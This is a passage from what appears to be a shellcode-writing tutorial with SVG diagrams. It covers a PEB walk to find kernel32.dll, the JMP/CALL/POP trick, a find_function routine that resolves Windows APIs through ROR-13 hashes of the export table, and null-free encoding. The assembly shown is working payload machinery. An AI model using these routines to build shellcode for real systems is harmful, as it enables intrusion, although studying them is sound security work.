  <rect x="274" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="287" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">2</text>
  <rect x="300" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="313" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">.</text>
  <rect x="326" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="339" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">d</text>
  <rect x="352" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="365" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">l</text>
  <rect x="378" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="391" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">l</text>
  <rect x="404" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
  <text x="417" y="82" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">\0</text>
  <!-- Index labels -->
  <text x="40" y="82" fill="#8b949e" font-size="10">Char index:</text>
  <text x="105" y="108" fill="#8b949e" font-size="8" text-anchor="middle">0</text>
  <text x="131" y="108" fill="#8b949e" font-size="8" text-anchor="middle">1</text>
  <text x="157" y="108" fill="#8b949e" font-size="8" text-anchor="middle">2</text>
  <text x="183" y="108" fill="#8b949e" font-size="8" text-anchor="middle">3</text>
  <text x="209" y="108" fill="#8b949e" font-size="8" text-anchor="middle">4</text>
  <text x="235" y="108" fill="#8b949e" font-size="8" text-anchor="middle">5</text>
  <text x="261" y="108" fill="#8b949e" font-size="8" text-anchor="middle">6</text>
  <text x="287" y="108" fill="#8b949e" font-size="8" text-anchor="middle">7</text>
  <text x="313" y="108" fill="#8b949e" font-size="8" text-anchor="middle">8</text>
  <text x="339" y="108" fill="#8b949e" font-size="8" text-anchor="middle">9</text>
  <text x="365" y="108" fill="#8b949e" font-size="8" text-anchor="middle">10</text>
  <text x="391" y="108" fill="#8b949e" font-size="8" text-anchor="middle">11</text>
  <text x="417" y="108" fill="#ff3366" font-size="8" text-anchor="middle" font-weight="bold">12</text>
  <!-- Annotation -->
  <rect x="440" y="62" width="290" height="50" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="585" y="82" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">cmp [edi + 12*2], cx</text>
  <text x="585" y="100" text-anchor="middle" fill="#e0e7ff" font-size="10">byte 24 = char index 12 = \0</text>
  <!-- Bottom comparison -->
  <rect x="92" y="125" width="640" height="55" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,4"/>
  <text x="130" y="148" fill="#ff6b35" font-size="11">"ntdll.dll"</text>
  <text x="270" y="148" fill="#8b949e" font-size="10">= 9 chars, index 12 is past the string</text>
  <text x="490" y="148" fill="#ff3366" font-size="11">NOT zero at [12*2]</text>
  <text x="130" y="168" fill="#ff6b35" font-size="11">"kernelbase.dll"</text>
  <text x="290" y="168" fill="#8b949e" font-size="10">= 14 chars, index 12 = 'l'</text>
  <text x="490" y="168" fill="#ff3366" font-size="11">NOT zero at [12*2]</text>
</svg></div>

**`jne next_module`** -- If the comparison fails, this is not our module. Loop to the next one.

When the loop exits, **EBX holds the base address of kernel32.dll**. This is the crucial value that the rest of our shellcode depends on.

### Visualizing the PEB Walk

<div align="center"><svg viewBox="0 0 750 420" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="arrow1" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#00ff88"/>
    </marker>
    <marker id="arrow2" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#00d4ff"/>
    </marker>
  </defs>
  <rect width="750" height="420" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">PEB Walk: Finding kernel32.dll Base Address</text>
  <rect x="20" y="55" width="120" height="70" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="80" y="78" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">TEB</text>
  <text x="80" y="100" text-anchor="middle" fill="#e0e7ff" font-size="11">fs:[0x30]</text>
  <text x="80" y="116" text-anchor="middle" fill="#8b949e" font-size="10">--> PEB ptr</text>
  <line x1="140" y1="90" x2="190" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#arrow1)"/>
  <rect x="195" y="55" width="130" height="70" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="260" y="78" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">PEB</text>
  <text x="260" y="100" text-anchor="middle" fill="#e0e7ff" font-size="11">[PEB+0x0C]</text>
  <text x="260" y="116" text-anchor="middle" fill="#8b949e" font-size="10">--> Ldr ptr</text>
  <line x1="325" y1="90" x2="380" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#arrow1)"/>
  <rect x="385" y="45" width="175" height="85" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="472" y="68" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">PEB_LDR_DATA</text>
  <text x="472" y="88" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x0C] InLoadOrder</text>
  <text x="472" y="103" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x14] InMemoryOrder</text>
  <text x="472" y="118" text-anchor="middle" fill="#ff3366" font-size="10" font-weight="bold">[+0x1C] InInitOrder</text>
  <line x1="560" y1="118" x2="560" y2="165" stroke="#00ff88" stroke-width="2" marker-end="url(#arrow1)"/>
  <rect x="30" y="175" width="200" height="90" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="130" y="198" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">ntdll.dll</text>
  <text x="130" y="218" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x08] BaseAddr = 0x7C9...</text>
  <text x="130" y="235" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x20] Name = "ntdll.dll"</text>
  <text x="130" y="255" text-anchor="middle" fill="#8b949e" font-size="10">name[12*2] != 0 --> skip</text>
  <rect x="275" y="175" width="200" height="90" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="375" y="198" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">kernelbase.dll</text>
  <text x="375" y="218" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x08] BaseAddr = 0x75E...</text>
  <text x="375" y="235" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x20] Name = "KERNELBASE..."</text>
  <text x="375" y="255" text-anchor="middle" fill="#8b949e" font-size="10">name[12*2] != 0 --> skip</text>
  <rect x="520" y="175" width="200" height="90" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
  <text x="620" y="198" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">kernel32.dll</text>
  <text x="620" y="218" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">[+0x08] BaseAddr --> EBX</text>
  <text x="620" y="235" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x20] Name = "kernel32.dll"</text>
  <text x="620" y="255" text-anchor="middle" fill="#00ff88" font-size="10">name[12*2] == 0 --> MATCH!</text>
  <line x1="230" y1="220" x2="275" y2="220" stroke="#00d4ff" stroke-width="2" marker-end="url(#arrow2)"/>
  <text x="252" y="212" text-anchor="middle" fill="#00d4ff" font-size="9">flink</text>
  <line x1="475" y1="220" x2="520" y2="220" stroke="#00d4ff" stroke-width="2" marker-end="url(#arrow2)"/>
  <text x="497" y="212" text-anchor="middle" fill="#00d4ff" font-size="9">flink</text>
  <line x1="560" y1="165" x2="130" y2="175" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrow1)"/>
  <rect x="80" y="300" width="590" height="100" rx="6" fill="#0a0e17" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,4"/>
  <text x="375" y="322" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Module Identification: Why cmp [edi+12*2], cx Works</text>
  <text x="375" y="345" text-anchor="middle" fill="#e0e7ff" font-size="11">"kernel32.dll" = 12 chars. In UTF-16LE, char index 12 = byte offset 24.</text>
  <text x="375" y="365" text-anchor="middle" fill="#e0e7ff" font-size="11">The 13th character of "kernel32.dll" is the null terminator (0x0000).</text>
  <text x="375" y="385" text-anchor="middle" fill="#00ff88" font-size="11">"ntdll.dll" has 9 chars, "kernelbase.dll" has 14 --> neither matches.</text>
</svg></div>

*Figure 3.1 - The PEB walk follows a chain of pointers from the TEB segment register through the PEB and loader data to a linked list of loaded modules. We identify kernel32.dll by checking that its 13th Unicode character is the null terminator -- a property unique to a 12-character module name.*

---

## 4. The find_function Engine: Resolving API Addresses

We now have kernel32.dll's base address in EBX. But a base address alone does not let us call functions. We need the exact virtual address of functions like `LoadLibraryA` and `CreateProcessA`. To get those, we must parse the **PE Export Table** -- the part of a DLL that says "here are the functions I export, and here is where each one lives in memory."

But first, we need to solve a bootstrapping problem: how does our shellcode reference its own internal function (`find_function`) when it does not know its own address?

### JMP/CALL/POP: Getting Our Own Address

This is one of the most elegant tricks in shellcode writing. The x86 `CALL` instruction does two things: it pushes the address of the *next* instruction onto the stack, then jumps to the target. We can exploit this to capture an address.

```nasm
find_function_shorten:
    jmp   find_function_shorten_bnc    ; (1) Jump forward

find_function_ret:
    pop   esi                          ; (3) ESI = address of find_function
    mov   [ebp+0x04], esi              ; (4) Save it in our variable table
    jmp   resolve_symbols_kernel32     ; (5) Continue to symbol resolution

find_function_shorten_bnc:
    call  find_function_ret            ; (2) CALL backward -- pushes addr of find_function

find_function:                         ; <-- this is the address CALL pushed
    pushad
    ; ... (the actual function body)
```

Here is the control flow step by step:

1. **JMP forward** over the `find_function_ret` block to `find_function_shorten_bnc`.
2. **CALL backward** to `find_function_ret`. The CALL instruction pushes the address of the *next* instruction -- which is `find_function` itself -- onto the stack.
3. **POP ESI** grabs that address off the stack. Now ESI holds the exact runtime address of `find_function`.
4. **Save it** at `[ebp+0x04]` so we can call it later with `call dword ptr [ebp+0x04]`.
5. **JMP** to the main code flow to start resolving symbols.

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="arrowG" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#00ff88"/>
    </marker>
    <marker id="arrowO" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#ff6b35"/>
    </marker>
  </defs>
  <rect width="750" height="340" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">JMP / CALL / POP Control Flow</text>
  <rect x="30" y="55" width="240" height="42" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="40" y="73" fill="#8b949e" font-size="10">find_function_shorten:</text>
  <text x="50" y="89" fill="#e0e7ff" font-size="12">jmp find_function_shorten_bnc</text>
  <rect x="30" y="110" width="240" height="72" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="40" y="128" fill="#8b949e" font-size="10">find_function_ret:</text>
  <text x="50" y="146" fill="#e0e7ff" font-size="12">pop esi</text>
  <text x="50" y="162" fill="#e0e7ff" font-size="12">mov [ebp+0x04], esi</text>
  <text x="50" y="178" fill="#e0e7ff" font-size="12">jmp resolve_symbols...</text>
  <rect x="30" y="195" width="240" height="42" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="40" y="213" fill="#8b949e" font-size="10">find_function_shorten_bnc:</text>
  <text x="50" y="229" fill="#ff6b35" font-size="12" font-weight="bold">call find_function_ret</text>
  <rect x="30" y="250" width="240" height="42" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="40" y="268" fill="#8b949e" font-size="10">find_function:</text>
  <text x="50" y="284" fill="#ff3366" font-size="12" font-weight="bold">pushad ; ... (body)</text>
  <path d="M 270,76 C 330,76 330,216 270,216" fill="none" stroke="#00ff88" stroke-width="2" marker-end="url(#arrowG)"/>
  <rect x="300" y="130" width="60" height="24" rx="5" fill="#0d1117"/>
  <text x="330" y="147" text-anchor="middle" fill="#00ff88" font-size="13" font-weight="bold">(1) JMP</text>
  <path d="M 270,216 C 380,216 380,145 270,145" fill="none" stroke="#ff6b35" stroke-width="2" marker-end="url(#arrowO)"/>
  <rect x="350" y="165" width="78" height="24" rx="5" fill="#0d1117"/>
  <text x="389" y="182" text-anchor="middle" fill="#ff6b35" font-size="13" font-weight="bold">(2) CALL</text>
  <rect x="490" y="195" width="235" height="95" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="607" y="215" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">CALL pushes onto stack:</text>
  <text x="607" y="240" text-anchor="middle" fill="#e0e7ff" font-size="12">address of next instruction</text>
  <text x="607" y="260" text-anchor="middle" fill="#e0e7ff" font-size="12">= address of find_function</text>
  <text x="607" y="280" text-anchor="middle" fill="#00ff88" font-size="11">(3) POP ESI retrieves it!</text>
  <line x1="430" y1="216" x2="490" y2="240" stroke="#ff6b35" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#arrowO)"/>
  <rect x="490" y="55" width="235" height="65" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="607" y="78" text-anchor="middle" fill="#00ff88" font-size="12">(4) Save at [ebp+0x04]</text>
  <text x="607" y="100" text-anchor="middle" fill="#00ff88" font-size="12">(5) JMP to main code flow</text>
</svg></div>

*Figure 4.1 - The JMP/CALL/POP trick exploits the fact that CALL pushes the next instruction's address onto the stack. By placing CALL just before find_function, we capture find_function's runtime address via POP, without needing any hardcoded addresses.*

### Parsing the PE Export Table

Now let's look at the `find_function` body itself. When we call it, EBX contains the base address of the target DLL, and a 4-byte hash of the desired function name has been pushed onto the stack.

The PE Export Table has a structure called `IMAGE_EXPORT_DIRECTORY` that contains three parallel arrays:

- **AddressOfNames** -- an array of RVAs pointing to the ASCII name of each exported function
- **AddressOfNameOrdinals** -- an array of 16-bit ordinals, one per name, that index into...
- **AddressOfFunctions** -- an array of RVAs pointing to the actual function code

Here is the complete `find_function` code:

```nasm
find_function:
    pushad                          ; Save all 8 registers (32 bytes on stack)
    mov   eax, [ebx+0x3c]          ; EAX = offset to PE signature
    mov   edi, [ebx+eax+0x78]      ; EDI = Export Table RVA (PE+0x78)
    add   edi, ebx                  ; EDI = Export Table VA (RVA + base)
    mov   ecx, [edi+0x18]          ; ECX = NumberOfNames (our loop counter)
    mov   eax, [edi+0x20]          ; EAX = AddressOfNames RVA
    add   eax, ebx                  ; EAX = AddressOfNames VA
    mov   [ebp-4], eax              ; Save AddressOfNames VA for the loop

find_function_loop:
    jecxz find_function_finished    ; If ECX == 0, we exhausted all names
    dec   ecx                       ; Decrement counter (we iterate backward)
    mov   eax, [ebp-4]              ; Restore AddressOfNames VA
    mov   esi, [eax+ecx*4]          ; ESI = RVA of the current function name
    add   esi, ebx                  ; ESI = VA of the current function name

compute_hash:
    xor   eax, eax                  ; EAX = 0
    cdq                             ; EDX = 0 (sign-extend EAX into EDX)
    cld                             ; Clear direction flag (LODSB goes forward)

compute_hash_again:
    lodsb                           ; AL = next byte from [ESI], ESI++
    test  al, al                    ; Is it the null terminator?
    jz    compute_hash_finished     ; Yes -- hash is complete
    ror   edx, 0x0d                 ; Rotate EDX right by 13 bits
    add   edx, eax                  ; Add current character to hash
    jmp   compute_hash_again        ; Next character

compute_hash_finished:
find_function_compare:
    cmp   edx, [esp+0x24]          ; Compare hash with the requested hash
    jnz   find_function_loop        ; No match -- try next name
    mov   edx, [edi+0x24]          ; EDX = AddressOfNameOrdinals RVA
    add   edx, ebx                  ; EDX = AddressOfNameOrdinals VA
    mov   cx, [edx+2*ecx]          ; CX = ordinal for this name (16-bit)
    mov   edx, [edi+0x1c]          ; EDX = AddressOfFunctions RVA
    add   edx, ebx                  ; EDX = AddressOfFunctions VA
    mov   eax, [edx+4*ecx]         ; EAX = function RVA (indexed by ordinal)
    add   eax, ebx                  ; EAX = function VA (final address!)
    mov   [esp+0x1c], eax          ; Overwrite saved EAX in pushad frame

find_function_finished:
    popad                           ; Restore all registers (EAX = resolved address)
    ret                             ;
```

**The ROR-13 Hash:** Instead of comparing full function name strings, we use a compact hash. The algorithm rotates the accumulator right by 13 bits before adding each character. The result is a 32-bit hash that is (for practical purposes) unique per function name. For example:
- `TerminateProcess` hashes to `0x78b5b983`
- `LoadLibraryA` hashes to `0xec0e4e8e`
- `CreateProcessA` hashes to `0x16b3fe72`

**The `[esp+0x24]` magic:** The caller does `push hash; call [ebp+0x04]`. The `call` pushes a 4-byte return address. Then `pushad` saves 8 registers (32 = `0x20` bytes). So the hash is at `ESP + 0x20 + 0x04 = ESP + 0x24`.

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="340" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">The pushad Frame: Why [esp+0x24] Reaches the Hash</text>
  <!-- Stack visualization -->
  <text x="60" y="55" fill="#8b949e" font-size="10">HIGH ADDR</text>
  <!-- Hash argument -->
  <rect x="200" y="60" width="280" height="32" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
  <text x="340" y="81" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Hash argument (0xec0e4e8e)</text>
  <text x="530" y="81" fill="#ff3366" font-size="11">ESP+0x24</text>
  <!-- Return address -->
  <rect x="200" y="95" width="280" height="32" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="340" y="116" text-anchor="middle" fill="#ff6b35" font-size="12">Return address (from CALL)</text>
  <text x="530" y="116" fill="#8b949e" font-size="10">+0x04</text>
  <!-- pushad frame -->
  <rect x="200" y="132" width="280" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="340" y="151" text-anchor="middle" fill="#e0e7ff" font-size="11">saved EDI</text>
  <text x="530" y="151" fill="#8b949e" font-size="10">+0x20</text>
  <rect x="200" y="162" width="280" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="340" y="181" text-anchor="middle" fill="#e0e7ff" font-size="11">saved ESI</text>
  <rect x="200" y="192" width="280" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="340" y="211" text-anchor="middle" fill="#e0e7ff" font-size="11">saved EBP, ESP, EBX, EDX, ECX</text>
  <rect x="200" y="222" width="280" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="2.5"/>
  <text x="340" y="241" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">saved EAX  [esp+0x1C] overwrite!</text>
  <text x="530" y="241" fill="#00ff88" font-size="10">+0x00</text>
  <!-- ESP pointer -->
  <rect x="200" y="255" width="280" height="28" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="340" y="274" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">ESP (after pushad)</text>
  <!-- Annotations -->
  <text x="60" y="285" fill="#8b949e" font-size="10">LOW ADDR</text>
  <!-- Brace for pushad -->
  <line x1="175" y1="135" x2="175" y2="250" stroke="#00d4ff" stroke-width="2"/>
  <line x1="175" y1="135" x2="185" y2="135" stroke="#00d4ff" stroke-width="2"/>
  <line x1="175" y1="250" x2="185" y2="250" stroke="#00d4ff" stroke-width="2"/>
  <text x="100" y="195" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">pushad</text>
  <text x="100" y="210" text-anchor="middle" fill="#00d4ff" font-size="10">0x20 bytes</text>
  <!-- Result box -->
  <rect x="140" y="295" width="470" height="30" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="315" text-anchor="middle" fill="#00ff88" font-size="11">After popad: EAX = resolved function address (written at [esp+0x1C])</text>
</svg></div>

**The pushad frame trick:** Writing to `[esp+0x1c]` overwrites the saved EAX in the pushad frame. When `popad` restores all registers, EAX magically contains our resolved function address.

### Using find_function

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983                ; Hash of "TerminateProcess"
    call  dword ptr [ebp+0x04]     ; Call find_function
    mov   [ebp+0x10], eax          ; Save resolved address

    push  0xec0e4e8e                ; Hash of "LoadLibraryA"
    call  dword ptr [ebp+0x04]     ; Call find_function
    mov   [ebp+0x14], eax          ; Save resolved address
```

Push the hash, call the engine, store the result. Three lines per API.

<div align="center"><svg viewBox="0 0 750 440" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="arwB" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00d4ff"/></marker>
    <marker id="arwG" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
    <marker id="arwR" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#ff3366"/></marker>
  </defs>
  <rect width="750" height="440" rx="10" fill="#0a0e17"/>
  <text x="375" y="25" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">PE Export Table: Three-Array Cross-Reference</text>
  <rect x="250" y="42" width="250" height="60" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="375" y="62" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">IMAGE_EXPORT_DIRECTORY</text>
  <text x="375" y="78" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x18] NumberOfNames   [+0x1C] AddrOfFunctions</text>
  <text x="375" y="92" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x20] AddrOfNames   [+0x24] AddrOfNameOrdinals</text>
  <text x="100" y="128" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">AddressOfNames</text>
  <rect x="30" y="152" width="140" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="171" text-anchor="middle" fill="#e0e7ff" font-size="11">[0] "AddAtomA"</text>
  <rect x="30" y="183" width="140" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="202" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <rect x="30" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
  <text x="100" y="233" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[n] "LoadLibraryA"</text>
  <text x="375" y="128" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">AddressOfNameOrdinals</text>
  <rect x="305" y="152" width="140" height="28" rx="3" fill="#151b28" stroke="#ff6b35" stroke-width="1"/>
  <text x="375" y="171" text-anchor="middle" fill="#e0e7ff" font-size="11">[0] ordinal: 2</text>
  <rect x="305" y="183" width="140" height="28" rx="3" fill="#151b28" stroke="#ff6b35" stroke-width="1"/>
  <text x="375" y="202" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <rect x="305" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
  <text x="375" y="233" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[n] ordinal: 831</text>
  <text x="640" y="128" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">AddressOfFunctions</text>
  <rect x="570" y="152" width="140" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1"/>
  <text x="640" y="171" text-anchor="middle" fill="#e0e7ff" font-size="11">[0] RVA 0x01A2F0</text>
  <rect x="570" y="183" width="140" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1"/>
  <text x="640" y="202" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <rect x="570" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
  <text x="640" y="233" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[831] RVA 0x15C40</text>
  <line x1="170" y1="228" x2="305" y2="228" stroke="#ff3366" stroke-width="2.5" marker-end="url(#arwR)"/>
  <rect x="198" y="209" width="95" height="18" rx="5" fill="#0d1117"/>
  <text x="245" y="223" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Step 1: index n</text>
  <line x1="445" y1="228" x2="570" y2="228" stroke="#ff3366" stroke-width="2.5" marker-end="url(#arwR)"/>
  <rect x="460" y="209" width="100" height="18" rx="5" fill="#0d1117"/>
  <text x="510" y="223" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Step 2: ord 831</text>
  <rect x="180" y="290" width="390" height="60" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="375" y="313" text-anchor="middle" fill="#00ff88" font-size="13" font-weight="bold">Resolution Complete</text>
  <text x="375" y="333" text-anchor="middle" fill="#e0e7ff" font-size="11">Function RVA + DLL Base Address = Final Virtual Address</text>
  <text x="375" y="348" text-anchor="middle" fill="#ff3366" font-size="12">EAX = kernel32_base + AddressOfFunctions[831]</text>
  <line x1="640" y1="242" x2="560" y2="300" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arwG)"/>
</svg></div>

*Figure 4.2 - The PE Export Table uses three parallel arrays. We hash each name in AddressOfNames until we find a match, use that same index to read the ordinal from AddressOfNameOrdinals, then use the ordinal as an index into AddressOfFunctions to get the function's RVA.*

These three capabilities -- skeleton, PEB walk, and API resolution -- are the foundation for everything that follows. Before we write our first payload, though, we need a toolkit of building-block techniques.

---

## 5. Null-Free Encoding Patterns

The single hardest constraint in shellcode writing is not size or complexity -- it is **bad characters**. The most common offender is `0x00`, the null byte. Here is a catalog of the patterns we will use throughout this series.

### Pattern 1: XOR Zeroing

Instead of `mov eax, 0` (which assembles as `B8 00 00 00 00`), we write:

```nasm
xor   eax, eax             ; EAX = 0, assembles as 31 C0 (two bytes, no nulls)
```

### Pattern 2: Two's Complement (ADD Instead of SUB)

```nasm
; Instead of: sub esp, 0x610  (contains null bytes)
add   esp, 0xfffff9f0       ; Same result: ESP - 0x610
```

The formula: `two's_complement(X) = NOT(X) + 1`.

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="280" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Two's Complement: 0x610 to 0xFFFFF9F0</text>
  <rect x="40" y="55" width="150" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="115" y="76" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">0x00000610</text>
  <text x="115" y="96" text-anchor="middle" fill="#8b949e" font-size="10">Original (has nulls!)</text>
  <line x1="195" y1="80" x2="238" y2="80" stroke="#00ff88" stroke-width="2"/>
  <polygon points="235,74 245,80 235,86" fill="#00ff88"/>
  <text x="220" y="70" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">NOT</text>
  <rect x="250" y="55" width="170" height="50" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="335" y="76" text-anchor="middle" fill="#ff6b35" font-size="13" font-weight="bold">0xFFFFF9EF</text>
  <text x="335" y="96" text-anchor="middle" fill="#8b949e" font-size="10">All bits flipped</text>
  <line x1="425" y1="80" x2="468" y2="80" stroke="#00ff88" stroke-width="2"/>
  <polygon points="465,74 475,80 465,86" fill="#00ff88"/>
  <text x="450" y="70" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">+ 1</text>
  <rect x="480" y="55" width="230" height="50" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="595" y="76" text-anchor="middle" fill="#00ff88" font-size="13" font-weight="bold">0xFFFFF9F0</text>
  <text x="595" y="96" text-anchor="middle" fill="#e0e7ff" font-size="10">No null bytes!</text>
  <text x="375" y="135" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">Bit-Level View (all 32 bits)</text>
  <text x="50" y="160" fill="#ff3366" font-size="11" font-weight="bold">0x0610:</text>
  <rect x="140" y="147" width="560" height="22" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="1"/>
  <text x="420" y="163" text-anchor="middle" fill="#e0e7ff" font-size="10">0000 0000 0000 0000 0000 0110 0001 0000</text>
  <text x="50" y="195" fill="#ff6b35" font-size="11" font-weight="bold">NOT:</text>
  <rect x="140" y="182" width="560" height="22" rx="3" fill="#151b28" stroke="#ff6b35" stroke-width="1"/>
  <text x="420" y="198" text-anchor="middle" fill="#ff6b35" font-size="10">1111 1111 1111 1111 1111 1001 1110 1111</text>
  <text x="50" y="230" fill="#00ff88" font-size="11" font-weight="bold">+1:</text>
  <rect x="140" y="217" width="560" height="22" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
